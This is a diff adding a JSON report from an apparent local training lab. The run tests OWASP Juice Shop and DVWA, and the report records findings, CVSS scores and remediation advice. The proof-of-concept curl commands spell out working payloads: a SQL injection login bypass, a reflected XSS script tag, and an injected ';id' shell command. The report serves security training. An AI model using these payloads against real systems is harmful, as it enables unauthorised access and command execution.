@@ -1,0 +1,119 @@
+{
+  "schema_version": "1",
+  "recipe": "training/vuln-lab",
+  "scope_id": "vuln-lab-local",
+  "summary": "Started OWASP Juice Shop v20.4.0 (localhost:3000) and DVWA at security level low (localhost:8081) with fixtures/lab.sh; both answered within 60 seconds. Proved three training flaws with one request each: login SQL injection on Juice Shop, reflected XSS and OS command injection on DVWA. The Juice Shop DOM XSS is a hypothesis because curl cannot show script execution. The lab was reset with compose down -v and both ports are closed. Not covered: any flaw outside this list.",
+  "tools_run": [
+    {
+      "name": "lab.sh",
+      "command": "bash fixtures/lab.sh up && bash fixtures/lab.sh wait",
+      "exit_code": 0,
+      "output": "artifacts/lab-health.txt"
+    },
+    {
+      "name": "curl",
+      "command": "curl -sS -i -X POST http://localhost:3000/rest/user/login -H 'Content-Type: application/json' --data @/tmp/sqli.json",
+      "exit_code": 0,
+      "output": "artifacts/LAB-001-response.txt"
+    },
+    {
+      "name": "curl",
+      "command": "curl -sS -i -b \"$jar\" -G --data-urlencode 'name=<script>alert(document.domain)</script>' http://localhost:8081/vulnerabilities/xss_r/",
+      "exit_code": 0,
+      "output": "artifacts/LAB-002-response.txt"
+    },
+    {
+      "name": "curl",
+      "command": "curl -sS -i -b \"$jar\" --data-urlencode 'ip=127.0.0.1;id' --data-urlencode 'Submit=Submit' http://localhost:8081/vulnerabilities/exec/",
+      "exit_code": 0,
+      "output": "artifacts/LAB-003-response.txt"
+    },
+    {
+      "name": "lab.sh",
+      "command": "bash fixtures/lab.sh reset",
+      "exit_code": 0,
+      "output": "artifacts/reset.txt"
+    }
+  ],
+  "findings": [
+    {
+      "id": "LAB-001",
+      "title": "SQL injection in the Juice Shop login bypasses authentication",
+      "severity": "critical",
+      "cvss": {"vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", "score": 9.1},
+      "cwe": "CWE-89",
+      "target": "http://localhost:3000/rest/user/login",
+      "location": "body.email",
+      "tool": "curl",
+      "rule": "sqli-auth-bypass",
+      "description": "The email field of POST /rest/user/login is concatenated into the SQL query. The value ' OR 1=1-- returns 200 and a session for the first account (admin@juice-sh.op). The same request with an unknown address returns 401.",
+      "proof": {
+        "poc": "printf '%s' '{\"email\":\"\\u0027 OR 1=1--\",\"password\":\"x\"}' > /tmp/sqli.json && curl -sS -i -X POST http://localhost:3000/rest/user/login -H 'Content-Type: application/json' --data @/tmp/sqli.json",
+        "artifacts": ["artifacts/LAB-001-request.txt", "artifacts/LAB-001-response.txt", "artifacts/LAB-001-control-response.txt"]
+      },
+      "remediation": "Use a parameterized query (bound parameters) for the login lookup and never build SQL from request fields.",
+      "references": ["https://owasp.org/www-community/attacks/SQL_Injection"]
+    },
+    {
+      "id": "LAB-002",
+      "title": "Reflected cross-site scripting in the DVWA name parameter",
+      "severity": "medium",
+      "cvss": {"vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", "score": 6.1},
+      "cwe": "CWE-79",
+      "target": "http://localhost:8081/vulnerabilities/xss_r/",
+      "location": "query.name",
+      "tool": "curl",
+      "rule": "xss-reflected",
+      "description": "At security level low the name parameter is written into the HTML response without encoding. A script tag sent in the query string comes back unchanged inside <pre>Hello ...</pre> with content type text/html.",
+      "proof": {
+        "poc": "curl -sS -i -b \"$jar\" -G --data-urlencode 'name=<script>alert(document.domain)</script>' http://localhost:8081/vulnerabilities/xss_r/ | grep '<pre>Hello <script>'",
+        "artifacts": ["artifacts/LAB-002-request.txt", "artifacts/LAB-002-response.txt"]
+      },
+      "remediation": "HTML-encode the parameter on output (htmlspecialchars) and add a Content-Security-Policy that forbids inline scripts.",
+      "references": ["https://owasp.org/www-community/attacks/xss/"]
+    },
+    {
+      "id": "LAB-003",
+      "title": "OS command injection in the DVWA ping form",
+      "severity": "high",
+      "cvss": {"vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "score": 8.8},
+      "cwe": "CWE-78",
+      "target": "http://localhost:8081/vulnerabilities/exec/",
+      "location": "body.ip",
+      "tool": "curl",
+      "rule": "os-command-injection",
+      "description": "At security level low the ip field is appended to a ping command line. The value 127.0.0.1;id runs a second command: the response contains the output of id (uid=33(www-data)). Only id was injected.",
+      "proof": {
+        "poc": "curl -sS -i -b \"$jar\" --data-urlencode 'ip=127.0.0.1;id' --data-urlencode 'Submit=Submit' http://localhost:8081/vulnerabilities/exec/ | grep 'uid='",
+        "artifacts": ["artifacts/LAB-003-request.txt", "artifacts/LAB-003-response.txt"]
+      },
+      "remediation": "Validate the field as an IP address and call ping without a shell (argument array), never by string concatenation.",
+      "references": ["https://owasp.org/www-community/attacks/Command_Injection"]
+    }
+  ],
+  "hypotheses": [
+    {
+      "id": "LAB-H01",
+      "title": "DOM XSS in the Juice Shop search field",
+      "rationale": "The search page renders the q parameter of the URL fragment (http://localhost:3000/#/search?q=...) in the browser. The fragment is never sent to the server, so an HTTP client cannot show the injected element or script execution.",
+      "next_step": "Load the URL with an iframe payload in a headless browser and capture the DOM."
+    }
+  ],
+  "artifacts": [
+    {"path": "artifacts/lab-health.txt", "description": "Lab start, readiness and compose ps output"},
+    {"path": "artifacts/LAB-001-request.txt", "description": "Login request with the SQL injection payload"},
+    {"path": "artifacts/LAB-001-response.txt", "description": "200 response with a session for the first account, token masked"},
+    {"path": "artifacts/LAB-001-control-response.txt", "description": "401 response to the same request without the payload"},
+    {"path": "artifacts/LAB-002-request.txt", "description": "Request with the script tag in the name parameter"},
+    {"path": "artifacts/LAB-002-response.txt", "description": "Response reflecting the script tag unencoded"},
+    {"path": "artifacts/LAB-003-request.txt", "description": "Ping form request with ;id appended"},
+    {"path": "artifacts/LAB-003-response.txt", "description": "Response containing the output of id"},
+    {"path": "artifacts/reset.txt", "description": "compose down -v output and closed-port check"}
+  ],
+  "metrics": {
+    "targets_ready": 2,
+    "flaws_proven": 3,
+    "requests_sent": 19,
+    "lab_reset": 1
+  }
+}
